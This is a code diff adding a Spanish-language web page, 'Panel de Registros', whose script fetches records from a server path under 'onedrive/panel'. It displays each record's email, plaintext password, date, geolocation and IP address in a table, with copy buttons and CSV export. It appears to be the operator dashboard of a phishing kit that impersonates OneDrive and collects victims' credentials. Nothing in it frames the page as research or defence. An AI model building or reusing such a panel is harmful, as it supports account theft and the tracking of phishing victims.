@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Panel de Registros</title>
+
+  <!-- Bootstrap Dark -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
+
+  <!-- Iconos Bootstrap -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
+
+  <style>
+    body {
+      background-color: #121212;
+      color: #f0f0f0;
+    }
+    .table-dark td, .table-dark th {
+      vertical-align: middle;
+    }
+    .copy-icon {
+      cursor: pointer;
+      margin-left: 6px;
+      color: #adb5bd;
+    }
+    .copy-icon:hover {
+      color: #ffffff;
+    }
+    .toast {
+      position: fixed;
+      bottom: 1rem;
+      right: 1rem;
+      z-index: 1055;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container mt-5">
+    <h2 class="mb-4 text-center">
+      Registros Recibidos
+      <i class="bi bi-download ms-3 text-light" style="cursor:pointer;" onclick="descargarCSV()" title="Descargar CSV"></i>
+    </h2>
+
+    <div class="table-responsive">
+      <table class="table table-dark table-striped table-bordered table-hover">
+        <thead>
+          <tr>
+            <th>ID</th>
+            <th>Email</th>
+            <th>Contraseña</th>
+            <th>Fecha</th>
+            <th>Latitud</th>
+            <th>Longitud</th>
+            <th>IP</th>
+          </tr>
+        </thead>
+        <tbody id="tablaDatos">
+          <tr><td colspan="7" class="text-center">Cargando datos...</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- Toast -->
+  <div class="toast bg-success text-white align-items-center" id="toastCopy" role="alert">
+    <div class="d-flex">
+      <div class="toast-body">Copiado al portapapeles</div>
+      <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+  <script>
+    let registros = [];
+
+    fetch("https://neurosense.mx/onedrive/panel/utils/getData.php")
+      .then(response => response.json())
+      .then(data => {
+        const tbody = document.getElementById("tablaDatos");
+        tbody.innerHTML = "";
+
+        if (data.status === "success" && data.data.length > 0) {
+          registros = data.data;
+          data.data.forEach(registro => {
+            const fila = `
+              <tr>
+                ${crearCelda(registro.id)}
+                ${crearCelda(registro.email)}
+                ${crearCelda(registro.password)}
+                ${crearCelda(registro.fecha)}
+                ${crearCelda(registro.lat)}
+                ${crearCelda(registro.lon)}
+                ${crearCelda(registro.ip)}
+              </tr>`;
+            tbody.innerHTML += fila;
+          });
+        } else {
+          tbody.innerHTML = '<tr><td colspan="7" class="text-center">No hay registros disponibles.</td></tr>';
+        }
+      })
+      .catch(error => {
+        console.error("Error al obtener los datos:", error);
+        document.getElementById("tablaDatos").innerHTML = '<tr><td colspan="7" class="text-center text-danger">Error al cargar los datos.</td></tr>';
+      });
+
+    function crearCelda(valor) {
+      return `<td>
+        ${valor}
+        <i class="bi bi-clipboard-fill copy-icon" onclick="copiar('${valor}')" title="Copiar al portapapeles"></i>
+      </td>`;
+    }
+
+    function copiar(texto) {
+      navigator.clipboard.writeText(texto).then(() => {
+        const toast = new bootstrap.Toast(document.getElementById('toastCopy'));
+        toast.show();
+      });
+    }
+
+    function descargarCSV() {
+      if (registros.length === 0) return;
+
+      const encabezados = ["ID", "Email", "Contraseña", "Fecha", "Latitud", "Longitud", "IP"];
+      const filas = registros.map(r => [r.id, r.email, r.password, r.fecha, r.lat, r.lon, r.ip]);
+
+      let csvContent = encabezados.join(",") + "\n" +
+                       filas.map(fila => fila.map(v => `"${v}"`).join(",")).join("\n");
+
+      const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
+      const url = URL.createObjectURL(blob);
+      const link = document.createElement("a");
+      link.setAttribute("href", url);
+      link.setAttribute("download", "registros.csv");
+      link.click();
+    }
+  </script>
+
+</body>
+</html>
